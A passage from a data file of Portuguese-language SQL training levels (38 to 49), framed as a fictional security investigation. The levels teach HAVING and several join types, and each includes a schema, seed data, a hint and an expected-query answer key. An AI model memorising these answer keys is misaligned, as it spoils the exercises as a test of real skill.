{
    id: 38,
    tier: "intermediario",
    certModule: "HAVING — Filtro de Grupos",
    title: "Nível 38: Sensores em Superaquecimento",
    briefing: "A rede de telemetria industrial da Aethelgard registra temperatura continuamente. Dra. Vance suspeita que o sabotador manipulou a refrigeração de certos equipamentos, e quer isolar os sensores com temperatura média perigosamente alta.",
    objective: "Agrupe os registros de 'sensor_readings' por 'sensor_id'. Projete 'sensor_id', a média de 'temperature_celsius' arredondada para 2 casas decimais como 'avg_temperature' e a contagem de leituras como 'reading_count'. Mantenha apenas os grupos com média de temperatura superior a 70 (HAVING AVG(temperature_celsius) > 70). Ordene o resultado por 'avg_temperature' de forma decrescente.",
    theory: {
        title: "Funções de Agregação, GROUP BY e HAVING",
        explanation: "Funções de agregação (COUNT, SUM, AVG, MIN, MAX) resumem várias linhas em um único valor. GROUP BY define o critério de agrupamento. HAVING é o WHERE das agregações — filtra os grupos já calculados, podendo usar diretamente o resultado de SUM(), COUNT() etc.",
        syntax: "SELECT coluna_grupo, AVG(valor) AS media, COUNT(*) AS total\nFROM tabela\nGROUP BY coluna_grupo\nHAVING AVG(valor) > 70;",
        example: "-- Turmas com média de frequência acima de 90%\nSELECT turma, ROUND(AVG(percentual_presenca), 2) AS media_presenca\nFROM registros_presenca\nGROUP BY turma\nHAVING AVG(percentual_presenca) > 90;"
    },
    schemaDDL: `
        CREATE TABLE sensor_readings (
            reading_id INTEGER PRIMARY KEY,
            sensor_id TEXT NOT NULL,
            temperature_celsius REAL NOT NULL,
            reading_time TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO sensor_readings (sensor_id, temperature_celsius, reading_time) VALUES
        ('SENSOR-A1', 75, '2026-01-01 00:00:00'),
        ('SENSOR-A1', 80, '2026-01-01 00:10:00'),
        ('SENSOR-A1', 78, '2026-01-01 00:20:00'),
        ('SENSOR-B2', 40, '2026-01-01 00:00:00'),
        ('SENSOR-B2', 42, '2026-01-01 00:10:00'),
        ('SENSOR-B2', 38, '2026-01-01 00:20:00'),
        ('SENSOR-C3', 90, '2026-01-01 00:00:00'),
        ('SENSOR-C3', 95, '2026-01-01 00:10:00'),
        ('SENSOR-C3', 92, '2026-01-01 00:20:00'),
        ('SENSOR-C3', 88, '2026-01-01 00:30:00'),
        ('SENSOR-D4', 60, '2026-01-01 00:00:00'),
        ('SENSOR-D4', 65, '2026-01-01 00:10:00'),
        ('SENSOR-D4', 62, '2026-01-01 00:20:00');
    `,
    expectedQuery: `
        SELECT
            sensor_id,
            ROUND(AVG(temperature_celsius), 2) AS avg_temperature,
            COUNT(*) AS reading_count
        FROM sensor_readings
        GROUP BY sensor_id
        HAVING AVG(temperature_celsius) > 70
        ORDER BY avg_temperature DESC, sensor_id ASC;
    `,
    hint: "Combine GROUP BY sensor_id com AVG(temperature_celsius) e COUNT(*), filtrando com HAVING AVG(temperature_celsius) > 70."
},
{
    id: 39,
    tier: "intermediario",
    certModule: "HAVING — Filtro de Grupos",
    title: "Nível 39: Agentes com Fila Crítica e Resolução Rápida",
    briefing: "A central de suporte ao cliente foi usada como vetor de engenharia social durante o incidente. Dra. Vance quer identificar agentes com volume relevante de chamados e tempo médio de resolução baixo — candidatos a terem processos automatizados ou scripts suspeitos.",
    objective: "Agrupe os registros de 'support_tickets' por 'agent_name'. Projete 'agent_name', a contagem de tickets como 'ticket_count' e a média de 'resolution_minutes' arredondada para 2 casas decimais como 'avg_resolution_minutes'. Mantenha apenas os grupos com 3 ou mais tickets E média de resolução inferior a 60 (HAVING COUNT(*) >= 3 AND AVG(resolution_minutes) < 60). Ordene o resultado por 'avg_resolution_minutes' de forma crescente.",
    theory: {
        title: "Funções de Agregação, GROUP BY e HAVING",
        explanation: "Funções de agregação (COUNT, SUM, AVG, MIN, MAX) resumem várias linhas em um único valor. GROUP BY define o critério de agrupamento. HAVING é o WHERE das agregações — filtra os grupos já calculados, podendo usar diretamente o resultado de SUM(), COUNT() etc., inclusive combinando múltiplas condições com AND.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total, AVG(valor) AS media\nFROM tabela\nGROUP BY coluna_grupo\nHAVING COUNT(*) >= 3 AND AVG(valor) < 60;",
        example: "-- Motoristas com 3 ou mais corridas e tempo médio abaixo de 20 minutos\nSELECT motorista, COUNT(*) AS corridas, ROUND(AVG(duracao_minutos), 2) AS tempo_medio\nFROM corridas_app\nGROUP BY motorista\nHAVING COUNT(*) >= 3 AND AVG(duracao_minutos) < 20;"
    },
    schemaDDL: `
        CREATE TABLE support_tickets (
            ticket_id INTEGER PRIMARY KEY,
            agent_name TEXT NOT NULL,
            resolution_minutes INTEGER NOT NULL,
            ticket_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO support_tickets (agent_name, resolution_minutes, ticket_date) VALUES
        ('Camila', 30, '2026-02-01'),
        ('Camila', 40, '2026-02-02'),
        ('Camila', 35, '2026-02-03'),
        ('Camila', 45, '2026-02-04'),
        ('Eduardo', 20, '2026-02-01'),
        ('Eduardo', 25, '2026-02-02'),
        ('Fernanda', 80, '2026-02-01'),
        ('Fernanda', 90, '2026-02-02'),
        ('Fernanda', 70, '2026-02-03'),
        ('Fernanda', 85, '2026-02-04'),
        ('Fernanda', 95, '2026-02-05'),
        ('Gustavo', 50, '2026-02-01'),
        ('Gustavo', 55, '2026-02-02'),
        ('Gustavo', 45, '2026-02-03');
    `,
    expectedQuery: `
        SELECT
            agent_name,
            COUNT(*) AS ticket_count,
            ROUND(AVG(resolution_minutes), 2) AS avg_resolution_minutes
        FROM support_tickets
        GROUP BY agent_name
        HAVING COUNT(*) >= 3 AND AVG(resolution_minutes) < 60
        ORDER BY avg_resolution_minutes ASC, agent_name ASC;
    `,
    hint: "Combine GROUP BY agent_name com COUNT(*) e AVG(resolution_minutes), filtrando com HAVING COUNT(*) >= 3 AND AVG(resolution_minutes) < 60."
},
{
    id: 40,
    tier: "intermediario",
    certModule: "HAVING — Filtro de Grupos",
    title: "Nível 40: Unidades com Severidade Acumulada Crítica",
    briefing: "O time de segurança registrou incidentes em várias unidades da Aethelgard, cada um com uma pontuação de severidade. Dra. Vance quer saber quais unidades acumularam uma pontuação total alta o suficiente para justificar uma investigação imediata.",
    objective: "Agrupe os registros de 'security_incidents' por 'business_unit'. Projete 'business_unit', a contagem de violações como 'violation_count' e a soma de 'severity_score' como 'total_severity'. Mantenha apenas os grupos com soma de severidade superior a 20 (HAVING SUM(severity_score) > 20). Ordene o resultado por 'total_severity' de forma decrescente.",
    theory: {
        title: "Funções de Agregação, GROUP BY e HAVING",
        explanation: "Funções de agregação (COUNT, SUM, AVG, MIN, MAX) resumem várias linhas em um único valor. GROUP BY define o critério de agrupamento. HAVING é o WHERE das agregações — filtra os grupos já calculados, podendo usar diretamente o resultado de SUM(), COUNT() etc.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total, SUM(valor) AS soma\nFROM tabela\nGROUP BY coluna_grupo\nHAVING SUM(valor) > 20;",
        example: "-- Filiais com pontuação de risco acumulada acima de 20\nSELECT filial, SUM(pontos_risco) AS risco_total\nFROM ocorrencias_filial\nGROUP BY filial\nHAVING SUM(pontos_risco) > 20;"
    },
    schemaDDL: `
        CREATE TABLE security_incidents (
            violation_id INTEGER PRIMARY KEY,
            business_unit TEXT NOT NULL,
            severity_score INTEGER NOT NULL,
            violation_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO security_incidents (business_unit, severity_score, violation_date) VALUES
        ('Unidade-Norte', 10, '2026-01-05'),
        ('Unidade-Norte', 15, '2026-01-10'),
        ('Unidade-Norte', 8, '2026-01-15'),
        ('Unidade-Sul', 5, '2026-01-06'),
        ('Unidade-Sul', 3, '2026-01-11'),
        ('Unidade-Leste', 12, '2026-01-07'),
        ('Unidade-Leste', 12, '2026-01-12'),
        ('Unidade-Leste', 12, '2026-01-17'),
        ('Unidade-Leste', 12, '2026-01-22'),
        ('Unidade-Oeste', 5, '2026-01-08'),
        ('Unidade-Oeste', 6, '2026-01-13'),
        ('Unidade-Oeste', 7, '2026-01-18');
    `,
    expectedQuery: `
        SELECT
            business_unit,
            COUNT(*) AS violation_count,
            SUM(severity_score) AS total_severity
        FROM security_incidents
        GROUP BY business_unit
        HAVING SUM(severity_score) > 20
        ORDER BY total_severity DESC, business_unit ASC;
    `,
    hint: "Combine GROUP BY business_unit com COUNT(*) e SUM(severity_score), filtrando com HAVING SUM(severity_score) > 20."
},
{
    id: 41,
    tier: "intermediario",
    certModule: "INNER JOIN — Cruzamento de Tabelas",
    title: "Nível 41: Dispositivos em Zonas Críticas",
    briefing: "A rede da Aethelgard é segmentada em zonas. Dra. Vance quer saber exatamente quais dispositivos operam dentro das zonas marcadas como críticas, já que foram o alvo mais provável do invasor.",
    objective: "Cruze a tabela 'network_devices' com 'network_zones' através da coluna 'zone_id'. Projete 'device_id', 'device_name' e 'zone_name' apenas para dispositivos cuja zona tenha 'is_critical' igual a 1. Ordene o resultado por 'device_id' de forma crescente.",
    theory: {
        title: "INNER JOIN — Combinando Tabelas Relacionadas",
        explanation: "Dados relacionais vivem espalhados em tabelas diferentes, conectadas por chaves. O INNER JOIN junta as linhas de duas tabelas onde essa chave coincide. Se uma linha de um lado não tiver correspondência do outro, ela não aparece no resultado.",
        syntax: "SELECT a.coluna1, b.coluna2\nFROM tabela_a a\nJOIN tabela_b b ON a.chave = b.chave\nWHERE b.condicao = valor;",
        example: "-- Máquinas localizadas em galpões com certificação ativa\nSELECT m.maquina_id, g.nome_galpao\nFROM maquinas m\nJOIN galpoes g ON m.galpao_id = g.id\nWHERE g.certificado_ativo = 1;"
    },
    schemaDDL: `
        CREATE TABLE network_zones (
            zone_id INTEGER PRIMARY KEY,
            zone_name TEXT NOT NULL,
            is_critical INTEGER NOT NULL
        );
        CREATE TABLE network_devices (
            device_id INTEGER PRIMARY KEY,
            device_name TEXT NOT NULL,
            zone_id INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO network_zones (zone_id, zone_name, is_critical) VALUES
        (1, 'DMZ', 0),
        (2, 'Nucleo-Critico', 1),
        (3, 'Rede-Convidados', 0),
        (4, 'Datacenter-Primario', 1);
        INSERT INTO network_devices (device_name, zone_id) VALUES
        ('RTR-01', 1),
        ('SRV-DB01', 2),
        ('AP-GUEST01', 3),
        ('SRV-APP01', 4),
        ('FW-EDGE01', 1),
        ('SRV-DB02', 2),
        ('SW-CORE01', 4),
        ('AP-GUEST02', 3);
    `,
    expectedQuery: `
        SELECT
            d.device_id,
            d.device_name,
            z.zone_name
        FROM network_devices d
        JOIN network_zones z ON d.zone_id = z.zone_id
        WHERE z.is_critical = 1
        ORDER BY d.device_id ASC;
    `,
    hint: "Utilize INNER JOIN entre network_devices e network_zones em zone_id, filtrando WHERE z.is_critical = 1."
},
{
    id: 42,
    tier: "intermediario",
    certModule: "INNER JOIN — Cruzamento de Tabelas",
    title: "Nível 42: Funcionários com Acesso Elevado",
    briefing: "O invasor precisou de credenciais de alto privilégio para se mover lateralmente. Dra. Vance quer a lista completa de colaboradores cujo cargo concede nível de acesso alto, para revisão de autenticação multifator.",
    objective: "Cruze a tabela 'staff_members' com 'job_roles' através da coluna 'role_id'. Projete 'staff_id', 'staff_name' e 'role_title' apenas para colaboradores cujo cargo tenha 'access_level' igual a 'Alto'. Ordene o resultado por 'staff_id' de forma crescente.",
    theory: {
        title: "INNER JOIN — Combinando Tabelas Relacionadas",
        explanation: "Dados relacionais vivem espalhados em tabelas diferentes, conectadas por chaves. O INNER JOIN junta as linhas de duas tabelas onde essa chave coincide. Se uma linha de um lado não tiver correspondência do outro, ela não aparece no resultado.",
        syntax: "SELECT a.coluna1, b.coluna2\nFROM tabela_a a\nJOIN tabela_b b ON a.chave = b.chave\nWHERE b.condicao = valor;",
        example: "-- Alunos matriculados em cursos com carga horária alta\nSELECT al.aluno_id, c.nome_curso\nFROM alunos al\nJOIN cursos c ON al.curso_id = c.id\nWHERE c.carga_horaria = 'Alta';"
    },
    schemaDDL: `
        CREATE TABLE job_roles (
            role_id INTEGER PRIMARY KEY,
            role_title TEXT NOT NULL,
            access_level TEXT NOT NULL
        );
        CREATE TABLE staff_members (
            staff_id INTEGER PRIMARY KEY,
            staff_name TEXT NOT NULL,
            role_id INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO job_roles (role_id, role_title, access_level) VALUES
        (1, 'Analista Junior', 'Baixo'),
        (2, 'Administrador de Sistemas', 'Alto'),
        (3, 'Assistente Administrativo', 'Baixo'),
        (4, 'Diretor de Seguranca', 'Alto');
        INSERT INTO staff_members (staff_name, role_id) VALUES
        ('Bianca Souza', 1),
        ('Caio Mendes', 2),
        ('Debora Farias', 3),
        ('Enzo Ribas', 4),
        ('Fabio Nunes', 1),
        ('Giovana Prado', 2),
        ('Heitor Lopes', 3),
        ('Isabela Rocha', 4);
    `,
    expectedQuery: `
        SELECT
            s.staff_id,
            s.staff_name,
            r.role_title
        FROM staff_members s
        JOIN job_roles r ON s.role_id = r.role_id
        WHERE r.access_level = 'Alto'
        ORDER BY s.staff_id ASC;
    `,
    hint: "Utilize INNER JOIN entre staff_members e job_roles em role_id, filtrando WHERE r.access_level = 'Alto'."
},
{
    id: 43,
    tier: "intermediario",
    certModule: "INNER JOIN — Cruzamento de Tabelas",
    title: "Nível 43: Transações sem Titular Identificado",
    briefing: "O banco recebeu transações de contas que não aparecem no cadastro. Dra. Vance quer ver todas as transações, inclusive as que não têm titular, para medir o tamanho real do problema.",
    objective: "Use RIGHT JOIN para cruzar 'bank_accounts' com 'bank_transactions' pela coluna 'account_id', mantendo todas as transações. Projete 'transaction_id', 'account_holder' e 'transaction_amount'. Transações sem conta cadastrada devem aparecer com 'account_holder' NULL. Ordene por 'transaction_id' em ordem crescente.",
    theory: {
        title: "RIGHT JOIN — Preservando a tabela da direita",
        explanation: "O RIGHT JOIN mantém todas as linhas da tabela da direita, mesmo quando não há correspondência do lado esquerdo. Onde não há par, as colunas da tabela da esquerda aparecem como NULL. Ele é o espelho do LEFT JOIN: a diferença está só em qual tabela você quer preservar. Muita gente prefere escrever tudo com LEFT JOIN invertendo a ordem, mas o RIGHT JOIN deixa a intenção explícita.",
        syntax: "SELECT a.coluna1, b.coluna2\nFROM tabela_a a\nRIGHT JOIN tabela_b b ON a.chave = b.chave;",
        example: "-- Todas as movimentações de estoque, mesmo as de produtos sem cadastro\nSELECT pr.nome_produto, mv.movimentacao_id\nFROM produtos pr\nRIGHT JOIN movimentacoes_estoque mv ON pr.id = mv.produto_id;"
    },
    schemaDDL: `
        CREATE TABLE bank_accounts (
            account_id INTEGER PRIMARY KEY,
            account_holder TEXT NOT NULL,
            account_status TEXT NOT NULL
        );
        CREATE TABLE bank_transactions (
            transaction_id INTEGER PRIMARY KEY,
            account_id INTEGER NOT NULL,
            transaction_amount REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO bank_accounts (account_id, account_holder, account_status) VALUES
        (1, 'Rogerio Lima', 'Normal'),
        (2, 'Tania Duarte', 'Suspeita'),
        (3, 'Marcelo Nunes', 'Normal'),
        (4, 'Patricia Gomes', 'Suspeita');
        INSERT INTO bank_transactions (account_id, transaction_amount) VALUES
        (1, 500),
        (2, 15000),
        (3, 300),
        (4, 20000),
        (2, 8000),
        (1, 700),
        (4, 12000),
        (3, 450),
        (9, 900);
    `,
    expectedQuery: `
        SELECT
            t.transaction_id,
            a.account_holder,
            t.transaction_amount
        FROM bank_accounts a
        RIGHT JOIN bank_transactions t ON a.account_id = t.account_id
        ORDER BY t.transaction_id ASC;
    `,
    hint: "Use RIGHT JOIN com bank_transactions do lado direito, em account_id, e ORDER BY transaction_id ASC. Transações sem conta ficam com account_holder NULL."
},
{
    id: 44,
    tier: "intermediario",
    certModule: "INNER JOIN — Cruzamento de Tabelas",
    title: "Nível 44: Conciliação de Pacotes e Transportadoras",
    briefing: "A auditoria de cargas encontrou pacotes com código de transportadora inexistente e transportadoras cadastradas sem nenhum pacote. Dra. Vance quer um relatório que mostre os dois casos.",
    objective: "Use FULL OUTER JOIN para conciliar 'cargo_packages' e 'carriers' pela coluna 'carrier_id'. Projete 'package_id', 'tracking_code' e 'carrier_name'. Pacotes sem transportadora e transportadoras sem pacote devem aparecer, com NULL no lado sem correspondência. Ordene por 'tracking_code' e depois por 'carrier_name', ambos em ordem crescente.",
    theory: {
        title: "FULL OUTER JOIN — Preservando os dois lados",
        explanation: "O FULL OUTER JOIN combina LEFT JOIN e RIGHT JOIN: mantém todas as linhas dos dois lados. Onde não existe correspondência, a coluna do outro lado aparece como NULL. Ele é útil para conciliações, porque a ausência de dados em qualquer lado também é informação que precisa aparecer no relatório.",
        syntax: "SELECT a.coluna1, b.coluna2\nFROM tabela_a a\nFULL OUTER JOIN tabela_b b ON a.chave = b.chave;",
        example: "-- Conciliar pedidos e pagamentos: mostra pedidos sem pagamento e pagamentos sem pedido\nSELECT pe.pedido_id, pg.pagamento_id\nFROM pedidos pe\nFULL OUTER JOIN pagamentos pg ON pe.pedido_id = pg.pedido_id;"
    },
    schemaDDL: `
        CREATE TABLE carriers (
            carrier_id INTEGER PRIMARY KEY,
            carrier_name TEXT NOT NULL,
            is_active INTEGER NOT NULL
        );
        CREATE TABLE cargo_packages (
            package_id INTEGER PRIMARY KEY,
            tracking_code TEXT NOT NULL,
            carrier_id INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO carriers (carrier_id, carrier_name, is_active) VALUES
        (1, 'LogEx', 1),
        (2, 'TransRapido', 0),
        (3, 'CargoMax', 1),
        (4, 'EntregaJa', 0),
        (5, 'NovaRota', 1);
        INSERT INTO cargo_packages (tracking_code, carrier_id) VALUES
        ('BR001', 1),
        ('BR002', 2),
        ('BR003', 3),
        ('BR004', 4),
        ('BR005', 1),
        ('BR006', 3),
        ('BR007', 2),
        ('BR008', 1),
        ('BR009', 9);
    `,
    expectedQuery: `
        SELECT
            p.package_id,
            p.tracking_code,
            c.carrier_name
        FROM cargo_packages p
        FULL OUTER JOIN carriers c ON p.carrier_id = c.carrier_id
        ORDER BY p.tracking_code ASC, c.carrier_name ASC;
    `,
    hint: "Use FULL OUTER JOIN entre cargo_packages e carriers em carrier_id. Os NULL aparecem onde não há correspondência. Ordene por tracking_code e carrier_name."
},
{
    id: 45,
    tier: "intermediario",
    certModule: "INNER JOIN — Cruzamento de Tabelas",
    title: "Nível 45: Convites para Clientes VIP",
    briefing: "A campanha de relacionamento precisa testar cada cliente VIP em cada canal de contato, para medir qual canal responde melhor. Todas as combinações entram no teste.",
    objective: "Use CROSS JOIN entre 'customers' e 'contact_channels' para gerar todas as combinações de clientes VIP com canais de contato. Projete 'customer_name' e 'channel_name'. Ordene por 'customer_name' e depois por 'channel_name', ambos em ordem crescente. CROSS JOIN não usa ON.",
    theory: {
        title: "CROSS JOIN — Todas as combinações",
        explanation: "O CROSS JOIN não tem condição de junção: cada linha de uma tabela é combinada com cada linha da outra. Se uma tabela tem 3 linhas e a outra tem 4, o resultado tem 12. Ele serve para gerar grades, como turnos × salas ou produtos × canais. Sem um WHERE, o resultado cresce muito rápido, então use com cuidado.",
        syntax: "SELECT a.coluna1, b.coluna2\nFROM tabela_a a\nCROSS JOIN tabela_b b;",
        example: "-- Todas as combinações de turno e sala para a escala de plantão\nSELECT t.turno, s.sala\nFROM turnos t\nCROSS JOIN salas s;"
    },
    schemaDDL: `
        CREATE TABLE customers (
            customer_id INTEGER PRIMARY KEY,
            customer_name TEXT NOT NULL,
            customer_category TEXT NOT NULL
        );
        CREATE TABLE contact_channels (
            channel_id INTEGER PRIMARY KEY,
            channel_name TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO customers (customer_id, customer_name, customer_category) VALUES
        (1, 'Renata Alves', 'Regular'),
        (2, 'Thiago Barros', 'VIP'),
        (3, 'Vanessa Cruz', 'Regular'),
        (4, 'Wagner Dias', 'VIP');
        INSERT INTO contact_channels (channel_name) VALUES
        ('Email'),
        ('SMS'),
        ('Telefone');
    `,
    expectedQuery: `
        SELECT
            c.customer_name,
            ch.channel_name
        FROM customers c
        CROSS JOIN contact_channels ch
        WHERE c.customer_category = 'VIP'
        ORDER BY c.customer_name ASC, ch.channel_name ASC;
    `,
    hint: "Use CROSS JOIN entre customers e contact_channels, sem ON. Filtre WHERE c.customer_category = 'VIP' e ordene por customer_name e channel_name."
},
{
    id: 46,
    tier: "intermediario",
    certModule: "LEFT JOIN & Detecção de Anomalias",
    title: "Nível 46: Funcionários Sem Crachá Físico",
    briefing: "O acesso físico a áreas restritas exige crachá cadastrado. Dra. Vance suspeita que alguém entrou nas instalações sem estar formalmente registrado no sistema de crachás — o que seria uma falha grave de segurança física.",
    objective: "Faça um LEFT JOIN de 'badge_employees' com 'security_badges' através da coluna 'employee_id'. Projete 'employee_id' e 'employee_name' apenas para funcionários que não possuem nenhum crachá associado (onde 'badge_id' resultante é NULL). Ordene o resultado por 'employee_id' de forma crescente.",
    theory: {
        title: "LEFT JOIN e Detecção de Registros Ausentes",
        explanation: "O LEFT JOIN retorna todas as linhas da tabela à esquerda, combinadas com as correspondentes da tabela à direita quando existem — e com NULL nas colunas da direita quando não existem. Filtrando com WHERE coluna_da_direita IS NULL, encontramos exatamente os registros da esquerda que não têm nenhuma correspondência, ou seja, anomalias como itens sem cadastro relacionado.",
        syntax: "SELECT a.coluna1, a.coluna2\nFROM tabela_a a\nLEFT JOIN tabela_b b ON a.chave = b.chave\nWHERE b.chave_b IS NULL;",
        example: "-- Veículos da frota sem nenhuma revisão registrada\nSELECT v.veiculo_id, v.placa\nFROM veiculos v\nLEFT JOIN revisoes r ON v.veiculo_id = r.veiculo_id\nWHERE r.revisao_id IS NULL;"
    },
    schemaDDL: `
        CREATE TABLE badge_employees (
            employee_id INTEGER PRIMARY KEY,
            employee_name TEXT NOT NULL
        );
        CREATE TABLE security_badges (
            badge_id INTEGER PRIMARY KEY,
            employee_id INTEGER NOT NULL,
            badge_status TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO badge_employees (employee_name) VALUES
        ('Alan Ferreira'),
        ('Bruna Castro'),
        ('Cesar Almeida'),
        ('Daniela Souza'),
        ('Emerson Vaz'),
        ('Flavia Torres');
        INSERT INTO security_badges (employee_id, badge_status) VALUES
        (1, 'Ativo'),
        (2, 'Ativo'),
        (4, 'Inativo');
    `,
    expectedQuery: `
        SELECT
            e.employee_id,
            e.employee_name
        FROM badge_employees e
        LEFT JOIN security_badges b ON e.employee_id = b.employee_id
        WHERE b.badge_id IS NULL
        ORDER BY e.employee_id ASC;
    `,
    hint: "Use LEFT JOIN de badge_employees com security_badges em employee_id, filtrando WHERE b.badge_id IS NULL."
},
{
    id: 47,
    tier: "intermediario",
    certModule: "LEFT JOIN & Detecção de Anomalias",
    title: "Nível 47: Servidores Sem Monitoramento",
    briefing: "Um servidor sem monitoramento configurado é um ponto cego perfeito para um invasor agir sem ser detectado. Dra. Vance precisa da lista de servidores da infraestrutura que não têm nenhuma ferramenta de monitoramento associada.",
    objective: "Faça um LEFT JOIN de 'infra_servers' com 'monitoring_configs' através da coluna 'server_id'. Projete 'server_id' e 'server_name' apenas para servidores que não possuem nenhuma configuração de monitoramento (onde 'config_id' resultante é NULL). Ordene o resultado por 'server_id' de forma crescente.",
    theory: {
        title: "LEFT JOIN e Detecção de Registros Ausentes",
        explanation: "O LEFT JOIN retorna todas as linhas da tabela à esquerda, combinadas com as correspondentes da tabela à direita quando existem — e com NULL nas colunas da direita quando não existem. Filtrando com WHERE coluna_da_direita IS NULL, encontramos exatamente os registros da esquerda que não têm nenhuma correspondência, ou seja, anomalias como itens sem cadastro relacionado.",
        syntax: "SELECT a.coluna1, a.coluna2\nFROM tabela_a a\nLEFT JOIN tabela_b b ON a.chave = b.chave\nWHERE b.chave_b IS NULL;",
        example: "-- Filiais sem nenhum contrato de manutenção de ar-condicionado\nSELECT f.filial_id, f.nome_filial\nFROM filiais f\nLEFT JOIN contratos_manutencao c ON f.filial_id = c.filial_id\nWHERE c.contrato_id IS NULL;"
    },
    schemaDDL: `
        CREATE TABLE infra_servers (
            server_id INTEGER PRIMARY KEY,
            server_name TEXT NOT NULL
        );
        CREATE TABLE monitoring_configs (
            config_id INTEGER PRIMARY KEY,
            server_id INTEGER NOT NULL,
            monitoring_tool TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO infra_servers (server_name) VALUES
        ('srv-web01'),
        ('srv-web02'),
        ('srv-db01'),
        ('srv-cache01'),
        ('srv-queue01'),
        ('srv-backup01');
        INSERT INTO monitoring_configs (server_id, monitoring_tool) VALUES
        (1, 'Datadog'),
        (2, 'Datadog'),
        (3, 'Prometheus');
    `,
    expectedQuery: `
        SELECT
            s.server_id,
            s.server_name
        FROM infra_servers s
        LEFT JOIN monitoring_configs m ON s.server_id = m.server_id
        WHERE m.config_id IS NULL
        ORDER BY s.server_id ASC;
    `,
    hint: "Use LEFT JOIN de infra_servers com monitoring_configs em server_id, filtrando WHERE m.config_id IS NULL."
},
{
    id: 48,
    tier: "intermediario",
    certModule: "LEFT JOIN & Detecção de Anomalias",
    title: "Nível 48: Sensores de Campo Sem Manutenção",
    briefing: "Sensores industriais sem manutenção registrada podem ter sido a porta de entrada para adulteração de dados de telemetria. Dra. Vance precisa da lista de sensores que nunca passaram por manutenção.",
    objective: "Faça um LEFT JOIN de 'field_sensors' com 'maintenance_logs' através da coluna 'sensor_id'. Projete 'sensor_id' e 'sensor_location' apenas para sensores que não possuem nenhum registro de manutenção (onde 'log_id' resultante é NULL). Ordene o resultado por 'sensor_id' de forma crescente.",
    theory: {
        title: "LEFT JOIN e Detecção de Registros Ausentes",
        explanation: "O LEFT JOIN retorna todas as linhas da tabela à esquerda, combinadas com as correspondentes da tabela à direita quando existem — e com NULL nas colunas da direita quando não existem. Filtrando com WHERE coluna_da_direita IS NULL, encontramos exatamente os registros da esquerda que não têm nenhuma correspondência, ou seja, anomalias como itens sem cadastro relacionado.",
        syntax: "SELECT a.coluna1, a.coluna2\nFROM tabela_a a\nLEFT JOIN tabela_b b ON a.chave = b.chave\nWHERE b.chave_b IS NULL;",
        example: "-- Equipamentos de laboratório sem nenhuma calibração registrada\nSELECT eq.equipamento_id, eq.nome\nFROM equipamentos eq\nLEFT JOIN calibracoes cal ON eq.equipamento_id = cal.equipamento_id\nWHERE cal.calibracao_id IS NULL;"
    },
    schemaDDL: `
        CREATE TABLE field_sensors (
            sensor_id INTEGER PRIMARY KEY,
            sensor_location TEXT NOT NULL
        );
        CREATE TABLE maintenance_logs (
            log_id INTEGER PRIMARY KEY,
            sensor_id INTEGER NOT NULL,
            maintenance_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO field_sensors (sensor_location) VALUES
        ('Setor-A'),
        ('Setor-B'),
        ('Setor-C'),
        ('Setor-D'),
        ('Setor-E'),
        ('Setor-F'),
        ('Setor-G');
        INSERT INTO maintenance_logs (sensor_id, maintenance_date) VALUES
        (1, '2026-01-10'),
        (2, '2026-02-15'),
        (3, '2026-03-01'),
        (1, '2026-04-01'),
        (5, '2026-05-05');
    `,
    expectedQuery: `
        SELECT
            s.sensor_id,
            s.sensor_location
        FROM field_sensors s
        LEFT JOIN maintenance_logs m ON s.sensor_id = m.sensor_id
        WHERE m.log_id IS NULL
        ORDER BY s.sensor_id ASC;
    `,
    hint: "Use LEFT JOIN de field_sensors com maintenance_logs em sensor_id, filtrando WHERE m.log_id IS NULL."
},
{
    id: 49,
    tier: "intermediario",
    certModule: "LEFT JOIN & Detecção de Anomalias",
    title: "Nível 49: Clientes Sem Nenhum Chamado Aberto",
    briefing: "Dra. Vance quer entender o padrão de uso normal do CRM antes de procurar anomalias. Um bom ponto de partida é identificar quais clientes nunca abriram um chamado de suporte — informação útil para descartar contas irrelevantes da investigação.",
    objective: "Faça um LEFT JOIN de 'crm_clients' com 'crm_tickets' através da coluna 'client_id'. Projete 'client_id' e 'client_name' apenas para clientes que não possuem nenhum ticket associado (onde 'ticket_id' resultante é NULL). Ordene o resultado por 'client_id' de forma crescente.",
    theory: {
        title: "LEFT JOIN e Detecção de Registros Ausentes",
        explanation: "O LEFT JOIN retorna todas as linhas da tabela à esquerda, combinadas com as correspondentes da tabela à direita quando existem — e com NULL nas colunas da direita quando não existem. Filtrando com WHERE coluna_da_direita IS NULL, encontramos exatamente os registros da esquerda que não têm nenhuma correspondência, ou seja, anomalias como itens sem cadastro relacionado.",
        syntax: "SELECT a.coluna1, a.coluna2\nFROM tabela_a a\nLEFT JOIN tabela_b b ON a.chave = b.chave\nWHERE b.chave_b IS NULL;",
        example: "-- Assinantes que nunca resgataram nenhum cupom\nSELECT ass.assinante_id, ass.nome\nFROM assinantes ass\nLEFT JOIN resgates res ON ass.assinante_id = res.assinante_id\nWHERE res.resgate_id IS NULL;"
    },
    schemaDDL: `
        CREATE TABLE crm_clients (
            client_id INTEGER PRIMARY KEY,
            client_name TEXT NOT NULL
        );
        CREATE TABLE crm_tickets (
            ticket_id INTEGER PRIMARY KEY,
            client_id INTEGER NOT NULL,
            ticket_subject TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO crm_clients (client_name) VALUES
        ('Alpha Corp'),
        ('Beta Ltda'),
        ('Gamma SA'),
        ('Delta ME'),
        ('Epsilon Tech'),
        ('Zeta Comercio');
        INSERT INTO crm_tickets (client_id, ticket_subject) VALUES
        (1, 'Erro de login'),
        (2, 'Fatura incorreta'),
        (1, 'Duvida sobre plano'),
        (4, 'Cancelamento');
    `,
    expectedQuery: `
        SELECT
            c.client_id,
            c.client_name
        FROM crm_clients c
        LEFT JOIN crm_tickets t ON c.client_id = t.client_id
        WHERE t.ticket_id IS NULL
        ORDER BY c.client_id ASC;
    `,
